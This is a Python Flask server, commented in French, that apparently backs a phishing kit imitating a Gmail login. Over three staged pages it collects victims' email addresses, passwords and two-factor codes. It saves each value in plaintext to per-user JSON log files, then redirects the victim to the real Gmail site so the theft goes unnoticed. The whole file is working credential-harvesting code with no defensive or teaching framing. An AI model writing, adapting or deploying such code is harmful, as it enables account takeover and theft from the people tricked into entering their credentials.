from flask import Flask, request, send_file, jsonify, make_response
import os
from datetime import datetime
import uuid
import json

app = Flask(__name__, static_folder='.', static_url_path='')

# Créer le dossier de logs
LOG_DIR = "user_logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

def log_data(user_id, data_type, data):
    """Enregistre les données dans un fichier JSON"""
    try:
        # Créer un fichier par utilisateur
        filename = f"{LOG_DIR}/{user_id}.json"
        
        # Charger les données existantes ou initialiser un nouveau log
        if os.path.exists(filename):
            with open(filename, "r") as f:
                log = json.load(f)
        else:
            log = {
                "user_id": user_id,
                "created_at": datetime.now().isoformat(),
                "logs": []
            }
        
        # Ajouter la nouvelle entrée
        timestamp = datetime.now().isoformat()
        log_entry = {
            "timestamp": timestamp,
            "type": data_type,
            "data": data
        }
        
        log["logs"].append(log_entry)
        
        # Sauvegarder dans le fichier
        with open(filename, "w") as f:
            json.dump(log, f, indent=2)
            
        print(f"Données enregistrées pour {user_id}: {data_type} - {data}")
        return True
    except Exception as e:
        print(f"Erreur d'enregistrement: {str(e)}")
        return False

@app.after_request
def add_cors_headers(response):
    """Gestion des en-têtes CORS"""
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
    return response

@app.route("/auth/email", methods=["POST"])
def auth_email():
    """Traitement de l'email"""
    try:
        email = request.form.get('email')
        
        if not email:
            return jsonify({"error": "Email requis"}), 400
            
        # Générer un ID unique pour cet utilisateur
        user_id = str(uuid.uuid4())
        
        # Enregistrer l'email
        log_data(user_id, "EMAIL", email)
        
        # Réponse avec redirection
        response = jsonify({
            "status": "success",
            "redirect": "/password.html"
        })
        
        # Définir un cookie pour l'utilisateur
        response.set_cookie(
            'user_id', 
            user_id,
            httponly=True,
            samesite='Lax'
        )
        
        return response, 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/auth/password", methods=["POST"])
def auth_password():
    """Traitement du mot de passe"""
    try:
        password = request.form.get('password')
        user_id = request.cookies.get('user_id')
        
        if not user_id:
            return jsonify({"error": "Session invalide"}), 400
            
        if not password:
            return jsonify({"error": "Mot de passe requis"}), 400
            
        # Enregistrer le mot de passe
        log_data(user_id, "PASSWORD", password)
        
        # Réponse avec redirection
        return jsonify({
            "status": "success",
            "redirect": "/2fa.html"
        }), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/auth/2fa", methods=["POST"])
def auth_2fa():
    """Traitement du code 2FA"""
    try:
        code = request.form.get('code')
        user_id = request.cookies.get('user_id')
        
        if not user_id:
            return jsonify({"error": "Session invalide"}), 400
            
        if not code:
            return jsonify({"error": "Code 2FA requis"}), 400
            
        # Enregistrer le code
        log_data(user_id, "2FA_CODE", code)
        
        # Réponse avec redirection vers Gmail
        return jsonify({
            "status": "success",
            "redirect": "https://mail.google.com"
        }), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Routes pour les pages HTML
@app.route("/")
def index():
    return send_file("login.html")

@app.route("/password.html")
def page_password():
    return send_file("password.html")

@app.route("/2fa.html")
def page_2fa():
    return send_file("2fa.html")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)